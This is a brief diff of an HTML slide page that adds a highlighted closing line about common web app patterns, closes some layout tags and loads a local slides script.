+                        <p style="margin-top: 1rem; color: #f59e0b; font-weight: bold;">These patterns are used in every production web app. 🚀</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
     </div>
 
     <script src="../js/slides.js"></script>
